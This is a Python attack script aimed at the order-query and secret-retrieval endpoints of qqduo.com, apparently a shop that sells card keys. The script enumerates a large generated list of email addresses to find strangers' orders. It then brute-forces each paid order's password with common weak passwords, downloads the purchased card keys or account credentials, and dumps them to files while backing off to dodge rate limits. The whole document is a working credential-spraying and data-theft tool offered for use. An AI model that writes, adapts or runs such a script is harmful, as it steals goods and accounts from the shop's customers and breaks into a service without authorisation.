#!/usr/bin/env python3
"""Focused high-value email spray for qqduo (weak locals + qq ranges)."""
import json, os, re, threading, time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import requests, urllib3
urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qqduo/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = "https://qqduo.com"
WORKERS = int(os.environ.get("WORKERS") or "20")

lock = threading.Lock()
tls = threading.local()
stats = {"done": 0, "hits": 0, "orders": 0, "kami": 0, "acc": 0, "errors": 0, "throttle": 0}
seen_tn, kami_tn = set(), set()
kami_rows, hit_orders, accounts = [], [], set()

# resume
for p in [OUT/"contact_hits.json", OUT/"contact_hits_all.json"]:
    if p.exists():
        for o in json.loads(p.read_text() or "[]"):
            tn=o.get("trade_no")
            if tn and tn not in seen_tn:
                seen_tn.add(tn); hit_orders.append(o)
if (OUT/"contact_kami.json").exists():
    for r in json.loads((OUT/"contact_kami.json").read_text() or "[]"):
        kami_rows.append(r); kami_tn.add(r.get("trade_no")); 
        for c in r.get("cards") or []: accounts.add(c)
stats["orders"]=len(seen_tn); stats["kami"]=len(kami_rows); stats["acc"]=len(accounts)

def log(*a): print(*a, flush=True)
def S():
    s=getattr(tls,"s",None)
    if not s:
        s=requests.Session(); s.verify=False
        s.headers.update({"User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest","Origin":B,"Referer":B+"/user/index/query"})
        tls.s=s
    return s
def cards(secret):
    blob=str(secret or "").replace("<br/>","\n").replace("<br>","\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]
def save():
    (OUT/"focus_state.json").write_text(json.dumps(stats,ensure_ascii=False))
    (OUT/"contact_kami.json").write_text(json.dumps(kami_rows,ensure_ascii=False,indent=2))
    (OUT/"contact_hits.json").write_text(json.dumps(hit_orders,ensure_ascii=False,indent=2))
    (OUT/"contact_accounts.txt").write_text("\n".join(sorted(accounts))+("\n" if accounts else ""))

def extract(j):
    if not isinstance(j,dict) or j.get("code")!=200: return []
    d=j.get("data")
    if isinstance(d,list): return d
    if isinstance(d,dict): return d.get("list") or []
    return []

PWS=["123456","000000","123123","111111","12345678","666666","888888","abcdef","abc123","112233","123321","654321","5201314","password","qwerty","qq123456","147258","aaaaaa","woaini"]

def fetch_secret(tn, kw):
    local=str(kw).split("@")[0]
    pws=[local,"123456",str(kw),local+"123",local+"456"]+PWS
    seen=set()
    for pw in pws:
        if pw in seen: continue
        seen.add(pw)
        try:
            j=S().post(B+"/user/api/index/secret",data={"tradeNo":tn,"password":pw},timeout=12).json()
        except Exception:
            continue
        if j.get("code")==200 and j.get("data"):
            d=j["data"]; return (d.get("secret") if isinstance(d,dict) else d), pw
        msg=str(j.get("msg") or "")
        if "频繁" in msg: time.sleep(10); continue
        if "还未支付" in msg: return None, None
    return None, None

def handle(kw, orders):
    with lock: stats["hits"]+=1
    for od in orders:
        tn=od.get("trade_no")
        with lock:
            if tn and tn not in seen_tn:
                seen_tn.add(tn); od=dict(od); od["_query_kw"]=kw; hit_orders.append(od); stats["orders"]=len(seen_tn); save()
        if od.get("status")!=1 or tn in kami_tn: continue
        secret,pw=fetch_secret(tn, od.get("contact") or kw)
        if not secret: continue
        cs=cards(secret)
        row={"trade_no":tn,"query_kw":kw,"password":pw,"amount":od.get("amount"),"contact":od.get("contact"),"pay_time":od.get("pay_time"),"commodity_id":od.get("commodity_id"),"secret":secret,"cards":cs,"card_count":len(cs)}
        with lock:
            kami_rows.append(row); kami_tn.add(tn); stats["kami"]=len(kami_rows)
            for c in cs: accounts.add(c)
            stats["acc"]=len(accounts); save()
        log("KAMI",tn,"kw",kw,"pw",pw,"cards",len(cs),"amount",od.get("amount"))

def work(kw):
    try:
        j=S().post(B+"/user/api/index/query",data={"keywords":kw},timeout=12).json()
    except Exception:
        with lock: stats["errors"]+=1; stats["done"]+=1
        return
    if "频繁" in str(j.get("msg") or ""):
        with lock: stats["throttle"]+=1
        time.sleep(12); return work(kw)
    orders=[x for x in extract(j) if isinstance(x,dict)]
    with lock:
        stats["done"]+=1
        if stats["done"]%2000==0: log("progress",stats,"kw",kw); save()
    if orders:
        log("HIT",kw,"n",len(orders),"paid",sum(1 for o in orders if o.get("status")==1))
        handle(kw, orders)

def wordlist():
    weak=["123","1234","12345","123456","1234567","12345678","123456789","123123","123321","111111","000000","666666","888888","112233","121212","1314520","5201314","7758521","10086","10010","admin","test","user","guest","qq","qqq","qq123","qq888","abc","abcd","abcdef","abc123","qwe","qwer","qwerty","asd","asdf","zxc","aaa","bbb","ccc","xxx","zzz","love","iloveyou","woaini","xiaoming","zhangsan","lisi","wangwu","aa123456","qq123456","email","mail"]
    # pinyin-ish common
    for n in ["chen","wang","li","zhang","liu","yang","huang","zhao","wu","zhou","xu","sun","ma","zhu","hu","guo","he","gao","lin","luo","zheng","liang","xie","song","tang","deng","han","cao","feng","peng","zeng","xiao","tian","dong","pan","yuan","cai","jiang","yu","du","ye","su","wei","cheng","lv","ding","ren","lu","yao","shen","zhong","cui","tan","fan","ge","fanfan","xiaohua","xiaolong","dahai","feifei","ning","lei","jun","hao","tao","bin","bo","qiang","weiwei","jing","ting","yan","fang","na","min","ping","hong","yun"]:
        weak += [n, n+"123", n+"123456", n+"666", n+"888"]
    domains=["qq.com","163.com","126.com","gmail.com","foxmail.com","outlook.com","yeah.net","139.com","sina.com","vip.qq.com","88.com","hotmail.com"]
    words=[]
    for loc in weak:
        for d in domains: words.append(f"{loc}@{d}")
    # qq numbers: 5-10 digits common ranges denser
    for i in range(10000, 300000):  # 5-6 digit
        words.append(f"{i}@qq.com")
    for i in range(1000000, 1005000):  # sample 7-digit
        words.append(f"{i}@qq.com")
    for i in range(100000000, 100002000):  # sample 9-digit
        words.append(f"{i}@qq.com")
    # phone@qq
    for pre in ["130","131","132","133","135","136","137","138","139","150","151","152","155","156","157","158","159","180","181","182","183","185","186","187","188","189"]:
        for mid in ["0000","1111","1234","6666","8888","0001","5201"]:
            for end in ["0000","1111","1234","6666","8888"]:
                words.append(f"{pre}{mid}{end}@qq.com")
    seen=set(); out=[]
    for w in words:
        if w not in seen: seen.add(w); out.append(w)
    return out

def main():
    words=wordlist(); log("words",len(words),"workers",WORKERS,"resume",len(seen_tn),len(kami_rows))
    t0=time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=64))
    save(); log("DONE",stats,"sec",int(time.time()-t0))

if __name__=="__main__":
    main()
